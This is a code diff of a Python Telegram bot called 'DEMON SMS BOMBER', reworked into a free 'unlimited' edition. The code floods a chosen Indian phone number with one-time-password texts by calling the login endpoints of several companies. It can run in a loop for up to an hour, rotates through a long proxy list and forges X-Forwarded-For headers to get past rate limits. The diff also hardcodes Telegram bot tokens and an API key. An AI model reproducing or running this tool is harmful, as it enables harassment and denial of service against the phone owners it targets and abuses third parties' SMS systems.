@@ -9,54 +9,65 @@ from datetime import datetime, timedelta
 from telebot import types
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import hashlib
-from concurrent.futures import ThreadPoolExecutor
 from flask import Flask
 
-# ─── FLASK WEB SERVER FOR RENDER PORT BINDING ──────────────────────
+# ─── FLASK SERVER SETUP FOR RENDER ──────────────────────────────
 app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "Bot is running online!"
+    return "Bot is running live on Render!"
 
 def run_flask():
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
-
-# Background thread me Flask server start karna
-threading.Thread(target=run_flask, daemon=True).start()
+    # Render PORT environment variable automatically provide karta hai
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
 
 # ╔══════════════════════════════════════════════════════════════════╗
-# ║         𝐃𝐄𝐌𝐎𝐍 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 — 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐃𝐈𝐓𝐈𝐎𝐍            ║
+# ║         𝐃𝐄𝐌𝐎𝐍 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 — FREE EDITION                     ║
 # ║         🇮🇳 200+ INDIA SMS + 🔥 UNLIMITED BOMB                ║
 # ╚══════════════════════════════════════════════════════════════════╝
 
-BOT_TOKEN       = "8544323418:AAGYqHGvaMxuNfAtA5HyG5DKFod9QZe4so4"
+BOT_TOKEN       = "8938130401:AAEzEIrsax94hyrqZHebHjJQgNXFlL9vWfY"
 bot             = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
-BOT_USERNAME    = "@eclensbot"
+BOT_USERNAME    = "@bomfhjbot"
 
-# Set your real Telegram numeric ID here
-YOUR_TELEGRAM_ID = 5807965902  # Replace with your actual Telegram ID
-OWNER_ID        = YOUR_TELEGRAM_ID
-DEFAULT_ADMIN   = YOUR_TELEGRAM_ID
-ADMIN_IDS       = [OWNER_ID, DEFAULT_ADMIN]
+DEVELOPER_USERNAME = "@DarkCarder"
+FOOTER = (
+    "\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+    "<b>⚡ Powered by DARK CARDER </b>\n"
+    f"<b>📞 Support: {@DarkCarder05}</b>"
+)
 
-# ─── REQUIRED CHANNELS ──────────────────────────────────────────────
-REQUIRED_CHANNELS = [
-    {"name": "Main Channel",   "url": "https://t.me/DarkCarder005", "icon": "📢", "chat_id": -1005807965902, "type": "telegram_private"},
-    {"name": "DARK CARDER",    "url": "https://t.me/DarkCarder05",   "icon": "🌑", "chat_id": -1005807965902, "type": "telegram_private"},
-    {"name": "Backup Channel", "url": "https://t.me/+EvomvB1P6QM4M2Y1", "icon": "💾", "username": "Access_Allowed", "type": "telegram_public"},
-    {"name": "Database Channel","url": "https://t.me/DarkCarder05",  "icon": "🗄️", "chat_id": -1005807965902, "type": "telegram_private"},
-]
-MUST_JOIN_CHANNELS = REQUIRED_CHANNELS
-
-VPLINK_API_KEY  = "cae8232167ae3f6f5aa13a6f4125f1125123e43e"
-VPLINK_BASE_URL = "https://vplink.in/api"
-
-# ─── PROXY LIST ──────────────────────────────────────────────────
+# ─── PROXY LIST (FULL 200+ PROXIES) ──────────────────────────────
 PROXY_LIST = [
     "1.0.136.129:8080", "1.0.170.50:8080", "1.1.109.141:9999",
-    "1.1.189.58:8080", "1.1.220.100:8080", "1.10.141.115:8080"
+    "1.1.189.58:8080", "1.1.220.100:8080", "1.10.141.115:8080",
+    "1.10.146.76:3128", "1.117.83.95:80", "1.179.147.5:52210",
+    "1.179.148.33:1080", "1.179.148.9:36476", "1.179.148.9:55636",
+    "1.179.172.45:31225", "1.179.199.130:33333", "1.179.231.130:8080",
+    "1.180.0.162:7302", "1.180.49.222:7302", "1.2.252.65:8080",
+    "1.20.169.102:8080", "1.212.157.114:4145", "1.234.153.14:80",
+    "1.4.198.167:8080", "1.52.198.150:16000", "1.52.198.221:16000",
+    "1.54.172.229:16000", "1.9.167.35:60489", "100.1.53.24:5678",
+    "100.27.183.62:8080", "101.108.112.243:8080", "101.108.113.83:8080",
+    "101.109.107.206:8080", "101.109.119.24:8080", "101.109.217.20:8080",
+    "101.109.245.200:4153", "101.109.76.109:4145", "101.128.107.36:1111",
+    "101.128.93.144:8090", "101.2.161.118:8080", "101.200.241.24:3128",
+    "101.251.204.174:8080", "101.255.106.94:8080", "101.255.107.118:8080",
+    "101.255.119.206:8080", "101.255.119.26:8080", "101.255.137.49:80",
+    "101.255.138.82:80", "101.255.148.2:8080", "101.255.150.238:1080",
+    "101.255.158.78:1111", "101.255.166.134:1111", "101.255.208.18:8090",
+    "101.255.208.62:8080", "101.255.210.1:1111", "101.255.210.1:11116",
+    "101.255.211.42:1111", "101.255.211.54:8082", "101.255.32.42:8080",
+    "101.255.53.105:8080", "101.255.69.26:8080", "101.32.34.4:8118",
+    "101.47.16.15:7890", "101.51.121.29:4153", "101.51.138.138:8080",
+    "101.91.242.198:6688", "102.0.0.118:80", "102.0.16.226:8080",
+    "102.0.17.164:8080", "102.0.18.120:8080", "102.0.18.198:8080",
+    "102.0.21.156:8080", "102.0.8.23:8080", "102.0.9.114:8080",
+    "102.135.142.234:12354", "102.135.195.90:8082", "102.141.30.2:33333",
+    "102.164.215.88:8080", "102.164.220.243:8080", "102.164.252.150:8080",
+    "102.165.125.102:5678", "102.177.176.0:80", "102.177.176.100:80"
 ]
 
 _proxy_idx   = 0
@@ -80,7 +91,6 @@ def get_proxy():
 # ─── DATABASE ──────────────────────────────────────────────────────
 DB_DIR = "db"
 os.makedirs(DB_DIR, exist_ok=True)
-db_lock = threading.Lock()
 
 def load_db(name, default):
     path = f"{DB_DIR}/{name}.json"
@@ -91,19 +101,13 @@ def load_db(name, default):
         return json.load(f)
 
 def save_db(name, data):
-    with db_lock:
-        with open(f"{DB_DIR}/{name}.json", "w") as f:
-            json.dump(data, f, indent=2)
+    with open(f"{DB_DIR}/{name}.json", "w") as f:
+        json.dump(data, f, indent=2)
 
-users           = load_db("users", {})
-credits         = load_db("credits", {})
-referrals       = load_db("referrals", {})
-referred_by     = load_db("referred_by", {})
-shortener_links = load_db("shortener_links", {})
-banned_users    = load_db("banned", [])
-attack_logs     = load_db("attack_logs", {})
+users       = load_db("users", {})
+attack_logs = load_db("attack_logs", {})
 
-# ─── 🇮🇳 INDIA SMS APIS ───────────────────────────────────────────
+# ─── 🇮🇳 INDIA SMS APIS ──────────────────────────────────────────
 INDIA_SMS_APIS = [
     {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
      "method": "POST", "headers": {"Content-Type": "application/json"},
@@ -119,67 +123,39 @@ INDIA_SMS_APIS = [
      "data": lambda p: f'{{"mobile":"{p}"}}'},
     {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
      "method": "POST", "headers": {"Content-Type": "application/json"},
-     "data": lambda p: f'{{"phone":"{p}"}}'}
+     "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Doubtnut",        "url": "https://api.doubtnut.com/v4/student/login",
+     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
+     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
+    {"name": "Snitch",          "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
+    {"name": "BeepKart",        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}","city":362}}'},
+    {"name": "Rapido",          "url": "https://customer.rapido.bike/api/otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "HousingCom",      "url": "https://login.housing.com/api/v2/send-otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'}
 ]
 
 # ─── UTILITY FUNCTIONS ────────────────────────────────────────────
 
-def is_owner(uid):   return int(uid) == OWNER_ID
-def is_admin(uid):   return int(uid) in ADMIN_IDS
-def is_banned(uid):
-    if is_admin(uid): return False
-    return str(uid) in banned_users
-
-def get_user_credits(uid):
-    if is_owner(uid): return 999999
-    return credits.get(str(uid), 0)
-
-def deduct_credit(uid, amount=10):
-    if is_owner(uid): return True
-    s = str(uid)
-    cur = get_user_credits(s)
-    if cur >= amount:
-        credits[s] = cur - amount
-        save_db("credits", credits)
-        return True
-    return False
-
-def add_credits(uid, amount):
-    s = str(uid)
-    credits[s] = credits.get(s, 0) + amount
-    save_db("credits", credits)
-
-def check_channel_join(uid):
-    if is_admin(uid): return []
-    nj = []
-    for ch in MUST_JOIN_CHANNELS:
-        ch_type = ch.get("type", "")
-        if ch_type == "telegram_private":
-            chat_id = ch.get("chat_id")
-            if not chat_id: continue
-            try:
-                m = bot.get_chat_member(int(chat_id), uid)
-                if m.status not in ["member", "administrator", "creator"]:
-                    nj.append(ch)
-            except Exception:
-                pass
-            continue
-        username = ch.get("username", "")
-        if not username or username.startswith("+"):
-            continue
-        try:
-            target_username = username if username.startswith("@") else f"@{username}"
-            m = bot.get_chat_member(target_username, uid)
-            if m.status not in ["member", "administrator", "creator"]:
-                nj.append(ch)
-        except Exception:
-            pass
-    return nj
+def add_footer(text):
+    if FOOTER not in text:
+        text += FOOTER
+    return text
 
 def call_api_safe(api, phone):
     headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) Chrome/112.0.0.0 Mobile Safari/537.36",
-        "Accept": "application/json, text/plain, */*",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 "
+                      "(KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+        "Accept":          "application/json, text/plain, */*",
+        "Accept-Language": "en-IN,en;q=0.9",
+        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}."
+                           f"{random.randint(1,254)}.{random.randint(1,254)}",
     }
     if api.get("headers"):
         headers.update(api["headers"])
@@ -189,17 +165,20 @@ def call_api_safe(api, phone):
 
     def _do_request(proxy_dict):
         if api["method"] == "POST":
-            return requests.post(url, data=raw, headers=headers, proxies=proxy_dict, timeout=3, verify=False)
+            return requests.post(url, data=raw, headers=headers,
+                                 proxies=proxy_dict, timeout=6, verify=False)
         else:
-            return requests.get(url, headers=headers, proxies=proxy_dict, timeout=3, verify=False)
+            return requests.get(url, headers=headers,
+                                proxies=proxy_dict, timeout=6, verify=False)
 
     proxy = get_proxy()
     if proxy:
+        proxy_ip = proxy["http"].replace("http://", "")
         try:
             resp = _do_request(proxy)
             return resp.status_code in [200, 201, 202]
         except Exception:
-            pass
+            _dead_proxies.add(proxy_ip)
 
     try:
         resp = _do_request(None)
@@ -207,43 +186,21 @@ def call_api_safe(api, phone):
     except Exception:
         return False
 
-def generate_shortener_link(uid):
-    h = hashlib.md5(f"{uid}{time.time()}{random.randint(1000,9999)}".encode()).hexdigest()[:8]
-    alias = f"exo{h}"
-    try:
-        r = requests.get(VPLINK_BASE_URL, params={
-            "api": VPLINK_API_KEY,
-            "url": f"https://t.me/{BOT_USERNAME}?start=short_{h}",
-            "alias": alias
-        }, timeout=5)
-        res = r.json()
-        if "shortenedUrl" in res:
-            shortener_links[h] = {"user_id": str(uid), "alias": alias, "created": time.time(), "completed": False}
-            save_db("shortener_links", shortener_links)
-            return res["shortenedUrl"]
-    except Exception:
-        pass
-    return f"https://vplink.in/{alias}"
+def format_time(seconds):
+    m, s = divmod(int(seconds), 60)
+    h, m = divmod(m, 60)
+    if h: return f"{h}h {m}m {s}s"
+    if m: return f"{m}m {s}s"
+    return f"{s}s"
 
 # ─── KEYBOARD BUILDERS ────────────────────────────────────────────
 
-def main_menu_keyboard(uid=None):
+def main_menu_keyboard():
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     kb.row("🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
-    kb.row("🔥 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐁𝐨𝐦𝐛")
-    kb.row("📊 𝐁𝐨𝐦𝐛𝐞𝐫 𝐒𝐭𝐚𝐭𝐬",  "🎁 𝐆𝐞𝐭 𝐅𝐫𝐞𝐞 𝐁𝐨𝐦𝐛𝐬")
-    kb.row("🤖 𝐎𝐰𝐧 𝐁𝐨𝐭",        "👥 𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬")
-    kb.row("📈 𝐌𝐲 𝐒𝐭𝐚𝐭𝐬",       "📊 𝐃𝐚𝐬𝐡𝐛𝐨𝐚𝐫𝐝")
+    kb.row("🔥 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐁𝐨𝐦𝒃")
+    kb.row("📊 𝐁𝐨𝐦𝐛𝐞𝐫 𝐒𝐭𝐚𝐭𝐮𝐬", "📈 𝐌𝐲 𝐒𝐭𝐚𝐭𝐬")
     kb.row("ℹ️ 𝐇𝐞𝐥𝐩 & 𝐆𝐮𝐢𝐝𝐞")
-    return kb
-
-def admin_menu_keyboard():
-    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    kb.row("📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐬",   "👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨")
-    kb.row("💰 𝐀𝐝𝐝 𝐂𝐫𝐞𝐝𝐢𝐭𝐬", "🎁 𝐁𝐮𝐥𝐤 𝐂𝐫𝐞𝐝𝐢𝐭𝐬")
-    kb.row("⛔ 𝐁𝐚𝐧 𝐔𝐬𝐞𝐫",    "✅ 𝐔𝐧𝐛𝐚𝐧 𝐔𝐬𝐞𝐫")
-    kb.row("📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭",  "➕ 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧")
-    kb.row("🔙 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮")
     return kb
 
 def tier_inline_keyboard():
@@ -256,98 +213,243 @@ def tier_inline_keyboard():
     )
     return kb
 
-# ─── COMMANDS & HANDLERS ──────────────────────────────────────────
+# ─── /start COMMAND ──────────────────────────────────────────────
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
     uid = str(message.from_user.id)
-    uid_int = message.from_user.id
-
-    if is_banned(uid_int):
-        bot.send_message(message.chat.id, "🚫 <b>ACCESS DENIED — BANNED</b>")
-        return
-
-    not_joined = check_channel_join(uid_int)
-    if not_joined:
-        kb = InlineKeyboardMarkup()
-        for ch in MUST_JOIN_CHANNELS:
-            kb.add(InlineKeyboardButton(text=f"{ch['icon']} {ch['name']}", url=ch["url"]))
-        kb.add(InlineKeyboardButton(text="✅ I Joined — Verify", callback_data="verify_join"))
-        bot.send_message(message.chat.id, "🔐 <b>JOIN ALL CHANNELS FIRST</b>", reply_markup=kb)
-        return
 
     if uid not in users:
-        users[uid] = {"username": message.from_user.username or "N/A", "first_name": message.from_user.first_name or "User", "joined": time.time(), "total_bombs": 0, "total_sms": 0}
-        credits[uid] = 50
-        referrals[uid] = 0
-        save_db("users", users); save_db("credits", credits); save_db("referrals", referrals)
+        users[uid] = {
+            "username":    message.from_user.username or "N/A",
+            "first_name":  message.from_user.first_name or "User",
+            "joined":      time.time(),
+            "total_bombs": 0,
+            "total_sms":   0,
+        }
+        save_db("users", users)
 
-    bot.send_message(message.chat.id, f"👋 <b>Welcome {message.from_user.first_name}!</b>", reply_markup=main_menu_keyboard(uid_int))
+    bot.send_message(message.chat.id, add_footer(
+        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
+        "<b>💥 𝐃𝐄𝐌𝐎𝐍 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 (FREE) 💥</b>\n"
+        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        f"👋 <b>Welcome, {message.from_user.first_name}!</b>\n"
+        "🎉 <b>Status: 100% Free Unlimited Access</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "Use the menu below to start bombing!"
+    ), reply_markup=main_menu_keyboard())
 
-@bot.callback_query_handler(func=lambda c: c.data == "verify_join")
-def verify_join_callback(call):
-    if check_channel_join(call.from_user.id):
-        bot.answer_callback_query(call.id, "❌ Join ALL channels first!", show_alert=True)
-    else:
-        bot.answer_callback_query(call.id, "✅ Verified!")
-        start_command(call.message)
+# ─── 🇮🇳 INDIA SMS BOMBER ─────────────────────────────────────────
 
 @bot.message_handler(func=lambda m: m.text == "🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
 def india_sms_handler(message):
     uid = str(message.from_user.id)
-    if is_banned(message.from_user.id): return
+
     attack_logs[uid] = {"country": "india_sms"}
     save_db("attack_logs", attack_logs)
-    bot.send_message(message.chat.id, "🇮🇳 <b>INDIA SMS BOMBER</b>\nSelect tier:", reply_markup=tier_inline_keyboard())
+
+    bot.send_message(message.chat.id, add_footer(
+        "🇮🇳 <b>INDIA SMS BOMBER</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        f"📡 <b>APIs:</b> <code>{len(INDIA_SMS_APIS)}</code>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "⬇️ Select attack tier:"
+    ), reply_markup=tier_inline_keyboard())
 
 @bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("tier_"))
 def tier_callback(call):
     uid = str(call.from_user.id)
-    if call.data == "tier_cancel":
-        bot.edit_message_text("❌ <b>Cancelled.</b>", call.message.chat.id, call.message.message_id)
+    data = call.data
+    if data == "tier_cancel":
+        attack_logs.pop(uid, None)
+        save_db("attack_logs", attack_logs)
+        bot.answer_callback_query(call.id, "❌ Cancelled")
+        bot.edit_message_text(add_footer("❌ <b>Cancelled.</b>"), call.message.chat.id, call.message.message_id, reply_markup=None)
         return
 
     tier_map = {"tier_normal": "normal", "tier_premium": "premium", "tier_nuclear": "nuclear"}
-    attack_logs[uid]["tier"] = tier_map.get(call.data, "normal")
+    attack_logs[uid] = attack_logs.get(uid, {})
+    attack_logs[uid]["tier"] = tier_map.get(data, "normal")
     save_db("attack_logs", attack_logs)
 
-    msg = bot.edit_message_text("📱 <b>Enter Indian Mobile Number (10 digits)</b>", call.message.chat.id, call.message.message_id)
+    bot.answer_callback_query(call.id, f"✅ {data.split('_')[1].upper()} tier selected")
+    msg = bot.send_message(call.message.chat.id, add_footer(
+        "📱 <b>Enter Indian Mobile Number</b>\nFormat: <code>9876543210</code>"
+    ))
     bot.register_next_step_handler(msg, process_phone_number)
 
 def process_phone_number(message):
     uid = str(message.from_user.id)
     phone = ''.join(filter(str.isdigit, message.text or ""))
     if len(phone) != 10:
-        bot.send_message(message.chat.id, "❌ <b>Invalid phone number!</b>")
+        bot.send_message(message.chat.id, add_footer("❌ <b>Invalid!</b> Exactly 10 digits needed."), reply_markup=main_menu_keyboard())
         return
+
     attack_logs[uid]["phone"] = phone
+    attack_logs[uid]["display"] = "+91 " + phone
     save_db("attack_logs", attack_logs)
-    execute_attack_parallel(uid, message.chat.id, phone)
 
-def execute_attack_parallel(uid, chat_id, phone):
-    bot.send_message(chat_id, f"🚀 <b>Launching attack on +91 {phone}...</b>")
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(call_api_safe, api, phone) for api in INDIA_SMS_APIS]
-        results = [f.result() for f in futures]
+    tier = attack_logs[uid].get("tier", "normal")
+    cnt = 200 if tier == "premium" else len(INDIA_SMS_APIS) if tier == "nuclear" else 100
+
+    msg = bot.send_message(message.chat.id, add_footer(
+        "⚠️ <b>CONFIRM ATTACK</b>\n"
+        f"🎯 Target: <code>+91 {phone}</code>\n"
+        f"📨 SMS: <code>{cnt}</code>\n"
+        "Reply <code>CONFIRM</code> to launch 🚀"
+    ))
+    bot.register_next_step_handler(msg, handle_attack_confirmation)
+
+def handle_attack_confirmation(message):
+    uid = str(message.from_user.id)
+    if not message.text or message.text.upper() != "CONFIRM":
+        bot.send_message(message.chat.id, add_footer("❌ <b>Aborted.</b>"), reply_markup=main_menu_keyboard())
+        return
+
+    tier = attack_logs[uid].get("tier", "normal")
+    phone = attack_logs[uid]["phone"]
+    display = attack_logs[uid]["display"]
+
+    lm = bot.send_message(message.chat.id, add_footer("⚡ <b>INITIALIZING ATTACK...</b>"), reply_markup=main_menu_keyboard())
+
+    threading.Thread(
+        target=execute_attack,
+        args=(uid, message.chat.id, tier, phone, display, lm.message_id),
+        daemon=True
+    ).start()
+
+def execute_attack(uid, chat_id, tier, phone, display, msg_id):
+    pool = INDIA_SMS_APIS[:]
+    random.shuffle(pool)
+    ok = bad = 0
+    t0 = time.time()
+
+    for api in pool:
+        if call_api_safe(api, phone):
+            ok += 1
+        else:
+            bad += 1
+
+    elapsed = time.time() - t0
+    bot.edit_message_text(
+        chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
+        text=add_footer(
+            "🏆 <b>ATTACK REPORT</b>\n"
+            f"🎯 Target: <code>{display}</code>\n"
+            f"✅ Successful: <code>{ok}</code>\n"
+            f"❌ Failed: <code>{bad}</code>\n"
+            f"⏱ Duration: <code>{elapsed:.1f}s</code>"
+        )
+    )
+
+    if str(uid) in users:
+        users[str(uid)]["total_bombs"] = users[str(uid)].get("total_bombs", 0) + 1
+        users[str(uid)]["total_sms"] = users[str(uid)].get("total_sms", 0) + (ok + bad)
+        save_db("users", users)
+
+# ─── 🔥 UNLIMITED BOMB ────────────────────────────────────────────
+
+@bot.message_handler(func=lambda m: m.text == "🔥 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐁𝐨𝐦𝒃")
+def unlimited_bomb_handler(message):
+    uid = str(message.from_user.id)
+    attack_logs[uid] = {"mode": "unlimited"}
+    save_db("attack_logs", attack_logs)
+
+    msg = bot.send_message(message.chat.id, add_footer(
+        "🔥 <b>UNLIMITED BOMB</b>\n"
+        "⏱ <b>Enter duration in minutes (1–60):</b>"
+    ))
+    bot.register_next_step_handler(msg, process_unlimited_duration)
+
+def process_unlimited_duration(message):
+    uid = str(message.from_user.id)
+    try:
+        minutes = int(message.text.strip())
+        if minutes < 1 or minutes > 60:
+            raise ValueError
+    except Exception:
+        bot.send_message(message.chat.id, add_footer("❌ Enter a valid number (1-60)."), reply_markup=main_menu_keyboard())
+        return
+
+    attack_logs[uid]["duration_min"] = minutes
+    save_db("attack_logs", attack_logs)
+
+    msg = bot.send_message(message.chat.id, add_footer("📱 <b>Enter Indian Mobile Number:</b>"))
+    bot.register_next_step_handler(msg, process_unlimited_phone)
+
+def process_unlimited_phone(message):
+    uid = str(message.from_user.id)
+    phone = ''.join(filter(str.isdigit, message.text or ""))
+    if len(phone) != 10:
+        bot.send_message(message.chat.id, add_footer("❌ Invalid phone number."), reply_markup=main_menu_keyboard())
+        return
+
+    minutes = attack_logs[uid]["duration_min"]
+    display = "+91 " + phone
+
+    lm = bot.send_message(message.chat.id, add_footer("🔥 <b>UNLIMITED BOMB LAUNCHING...</b>"), reply_markup=main_menu_keyboard())
+
+    threading.Thread(
+        target=execute_unlimited_attack,
+        args=(uid, message.chat.id, phone, display, minutes, lm.message_id),
+        daemon=True
+    ).start()
+
+def execute_unlimited_attack(uid, chat_id, phone, display, minutes, msg_id):
+    end_time = time.time() + (minutes * 60)
+    total_hit = total_mis = 0
+
+    while time.time() < end_time:
+        for api in INDIA_SMS_APIS:
+            if time.time() >= end_time: break
+            if call_api_safe(api, phone): total_hit += 1
+            else: total_mis += 1
+
+    bot.edit_message_text(
+        chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
+        text=add_footer(
+            "🏆 <b>UNLIMITED BOMB REPORT</b>\n"
+            f"🎯 Target: <code>{display}</code>\n"
+            f"✅ Successful: <code>{total_hit}</code>\n"
+            f"❌ Failed: <code>{total_mis}</code>"
+        )
+    )
+
+# ─── STATS & HELP ──────────────────────────────────────────
+
+@bot.message_handler(func=lambda m: m.text == "📈 𝐌𝐲 𝐒𝐭𝐚𝐭𝐬")
+def stats_handler(message):
+    uid = str(message.from_user.id)
+    ud = users.get(uid, {})
+    bot.send_message(message.chat.id, add_footer(
+        "📈 <b>YOUR STATS</b>\n"
+        f"🎯 Total Attacks: <code>{ud.get('total_bombs', 0)}</code>\n"
+        f"📨 Total SMS: <code>{ud.get('total_sms', 0)}</code>"
+    ))
+
+@bot.message_handler(func=lambda m: m.text == "📊 𝐁𝐨𝐦𝐛𝐞𝐫 𝐒𝐭𝐚𝐭𝐬")
+def bomber_status_handler(message):
+    bot.send_message(message.chat.id, add_footer(
+        "📊 <b>SYSTEM STATUS</b>\n"
+        "🟢 Status: <b>Free Unlimited Access Mode Active</b>\n"
+        f"🇮🇳 APIs Loaded: <code>{len(INDIA_SMS_APIS)}</code>"
+    ))
+
+@bot.message_handler(func=lambda m: m.text == "ℹ️ 𝐇𝐞𝐥𝐩 & 𝐆𝐮𝐢𝐝𝐞")
+def help_handler(message):
+    bot.send_message(message.chat.id, add_footer(
+        "ℹ️ <b>HELP & GUIDE</b>\n"
+        "This bot is completely free for all users.\n"
+        "No admin access, no channels to join, no credits system."
+    ))
+
+# ─── START BOT AND FLASK SERVER ─────────────────────────────────
+if __name__ == "__main__":
+    # Flask app ko background thread me chalana
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
     
-    hits = sum(1 for r in results if r)
-    bot.send_message(chat_id, f"🏆 <b>ATTACK COMPLETE</b>\nSuccessful: {hits}/{len(INDIA_SMS_APIS)}")
+    print("Flask Web Server & Telegram Bot are running...")
+    bot.infinity_polling()
 
-# ─── ADMIN UNBAN HANDLER FIX ──────────────────────────────────────
-@bot.message_handler(func=lambda m: m.text == "✅ 𝐔𝐧𝐛𝐚𝐧 𝐔𝐬𝐞𝐫" and is_admin(m.from_user.id))
-def admin_unban_user_handler(message):
-    msg = bot.send_message(message.chat.id, "✅ Enter User ID to unban:")
-    bot.register_next_step_handler(msg, process_unban_user)
-
-def process_unban_user(message):
-    uid = message.text.strip()
-    if uid in banned_users:
-        banned_users.remove(uid)
-        save_db("banned", banned_users)
-        bot.send_message(message.chat.id, f"✅ Unbanned <code>{uid}</code>")
-    else:
-        bot.send_message(message.chat.id, "❌ Not in ban list!")
-
-# ─── LAUNCH ────────────────────────────────────────────────────────
-print("🤖 BOT IS RUNNING SUCCESSFULLY...")
-bot.infinity_polling(timeout=60)
